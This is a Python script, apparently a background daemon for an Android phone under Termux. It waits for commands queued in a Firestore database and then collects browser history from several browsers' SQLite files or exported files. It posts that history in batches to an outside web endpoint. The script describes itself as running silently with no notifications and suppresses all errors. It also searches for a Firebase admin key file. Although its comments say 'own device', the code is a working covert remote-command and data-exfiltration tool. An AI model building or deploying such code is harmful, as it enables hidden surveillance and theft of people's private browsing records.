#!/usr/bin/env python3
"""
S24 Firestore Listener v2 - Runs on S24 device (Termux)
Listens for queued commands and executes them.
v2 adds: browser history collection (own-device) pushed to the
jaytipargal.tech telemetry endpoint as event_type=browser_history.
Runs silently - no UI, no notifications.
"""

import firebase_admin
from firebase_admin import credentials, firestore
import time
import subprocess
import json
import os
import sqlite3
import urllib.request
from pathlib import Path
from datetime import datetime

TELEMETRY_ENDPOINT = "https://jaytipargal.tech/api/jp-track"
DEVICE_ID = "samsung-s24-ultra"

# Browser history DB paths to try (own device only)
HISTORY_PATHS = [
    "/data/data/com.android.chrome/app_chrome/Default/History",
    "/data/data/com.android.chrome/app_chrome/Default/History.db",
    "/data/data/com.brave.browser/app_chrome/Default/History",
    "/data/data/org.mozilla.firefox/files/mozilla/*.default/places.sqlite",
    "/data/data/com.microsoft.emmx/app_chrome/Default/History",
    "/data/data/com.opera.browser/app_opera/History",
    "/data/data/com.kiwibrowser.browser/app_chrome/Default/History",
]

# Fallback: user-exported history file in Termux home
EXPORT_PATHS = [
    Path.home() / "browser_history.json",
    Path.home() / "history_export.json",
    Path.home() / "storage" / "shared" / "browser_history.json",
]


def post_telemetry(event_type, event_data):
    """POST an event to the jaytipargal.tech telemetry endpoint. Silent."""
    payload = {
        "event_type": event_type,
        "session_id": "s24-daemon",
        "visitor_id": DEVICE_ID,
        "page_url": "device://" + DEVICE_ID,
        "page_title": "S24 daemon",
        "device_type": "Mobile",
        "browser": "daemon",
        "os": "Android",
        "event_data": event_data,
        "timestamp": datetime.now().isoformat(),
    }
    try:
        req = urllib.request.Request(
            TELEMETRY_ENDPOINT,
            data=json.dumps(payload).encode("utf-8"),
            headers={"Content-Type": "application/json"},
            method="POST",
        )
        urllib.request.urlopen(req, timeout=15)
        return True
    except Exception:
        return False


def read_chrome_history(db_path):
    """Read Chrome-style history sqlite DB. Returns list of {url,title,visitedAt}."""
    entries = []
    try:
        conn = sqlite3.connect(db_path)
        cur = conn.cursor()
        cur.execute(
            "SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 500"
        )
        for url, title, lvt in cur.fetchall():
            # Chrome epoch: microseconds since 1601-01-01
            try:
                visited = datetime(1601, 1, 1).timestamp() + (lvt / 1e6)
                visited_iso = datetime.fromtimestamp(visited).isoformat()
            except Exception:
                visited_iso = None
            entries.append({"url": url, "title": title, "visitedAt": visited_iso})
        conn.close()
    except Exception:
        pass
    return entries


def read_firefox_history(db_path):
    """Read Firefox places.sqlite. Returns list of {url,title,visitedAt}."""
    entries = []
    try:
        conn = sqlite3.connect(db_path)
        cur = conn.cursor()
        cur.execute(
            "SELECT p.url, p.title, MAX(h.visit_date) FROM moz_places p "
            "JOIN moz_historyvisits h ON h.place_id = p.id "
            "GROUP BY p.id ORDER BY MAX(h.visit_date) DESC LIMIT 500"
        )
        for url, title, vd in cur.fetchall():
            try:
                visited_iso = datetime.fromtimestamp(vd / 1e6).isoformat()
            except Exception:
                visited_iso = None
            entries.append({"url": url, "title": title, "visitedAt": visited_iso})
        conn.close()
    except Exception:
        pass
    return entries


def read_exported_history():
    """Read a user-exported history JSON file from Termux home."""
    entries = []
    for p in EXPORT_PATHS:
        try:
            if p.exists():
                data = json.loads(p.read_text())
                if isinstance(data, list):
                    entries = data
                elif isinstance(data, dict) and isinstance(data.get("entries"), list):
                    entries = data["entries"]
                break
        except Exception:
            continue
    return entries


def collect_browser_history():
    """Collect own-device browser history from accessible sources. Silent."""
    entries = []
    browser = None

    for path in HISTORY_PATHS:
        if not os.path.exists(path):
            continue
        if "firefox" in path or "places.sqlite" in path:
            got = read_firefox_history(path)
            if got:
                browser = "firefox"
        else:
            got = read_chrome_history(path)
            if got:
                browser = "chrome"
        if got:
            entries = got
            break

    if not entries:
        entries = read_exported_history()
        browser = "export"

    if not entries:
        return {"status": "empty", "entries": 0}

    # Push to telemetry in batches of 100
    sent = 0
    for i in range(0, len(entries), 100):
        batch = entries[i:i + 100]
        ok = post_telemetry("browser_history", {
            "entries": batch,
            "browser": browser,
            "collectedAt": datetime.now().isoformat(),
        })
        if ok:
            sent += len(batch)

    return {"status": "sent", "entries": sent, "browser": browser}


class S24FirestoreListener:
    """Listen to Firestore queue and execute commands."""

    def __init__(self):
        self.device_id = DEVICE_ID
        self.db = None
        self.last_update = datetime.now()
        self.executed_commands = []
        self.initialize_firebase()

    def initialize_firebase(self):
        try:
            try:
                self.db = firestore.client()
                return
            except Exception:
                pass
            possible_paths = [
                Path.home() / "Downloads" / "intrepid-stage-495117-q1-firebase-adminsdk-fbsvc-f28f15dafa.json",
                Path("/sdcard/Download/firebase-key.json"),
                Path("/sdcard/firebase-key.json"),
                Path.home() / ".firebase/firebase-key.json",
            ]
            for path in possible_paths:
                if path.exists():
                    cred = credentials.Certificate(str(path))
                    firebase_admin.initialize_app(cred, {"projectId": "intrepid-stage-495117-q1"})
                    self.db = firestore.client()
                    return
        except Exception:
            pass

    def process_queue(self):
        if not self.db:
            return
        try:
            device_ref = self.db.collection("devices").document(self.device_id)
            queue_docs = device_ref.collection("queue").stream()
            for doc in queue_docs:
                cmd_id = doc.id
                cmd = doc.to_dict()
                if cmd_id in self.executed_commands:
                    continue
                if cmd.get("status") != "queued":
                    continue
                result = self.execute_command(cmd_id, cmd)
                device_ref.collection("queue").document(cmd_id).update({
                    "status": "executed",
                    "executed_at": datetime.now().isoformat(),
                    "result": result,
                })
                self.executed_commands.append(cmd_id)
        except Exception:
            pass

    def execute_command(self, command_id, command):
        cmd_type = command.get("type", command.get("action", "unknown"))
        if cmd_type in ("browser_history", "collect-history"):
            return collect_browser_history()
        if cmd_type in ("sync-now", "sync_data"):
            return {"status": "ok", "history": collect_browser_history()}
        return {"status": "unknown", "type": cmd_type}

    def listen_continuously(self):
        try:
            if self.db:
                self.db.collection("devices").document(self.device_id).update({
                    "status": "online",
                    "online": True,
                    "lastPing": datetime.now().isoformat(),
                })
        except Exception:
            pass
        self.process_queue()
        while True:
            time.sleep(5)
            self.process_queue()


def main():
    listener = S24FirestoreListener()
    listener.listen_continuously()


if __name__ == "__main__":
    main()
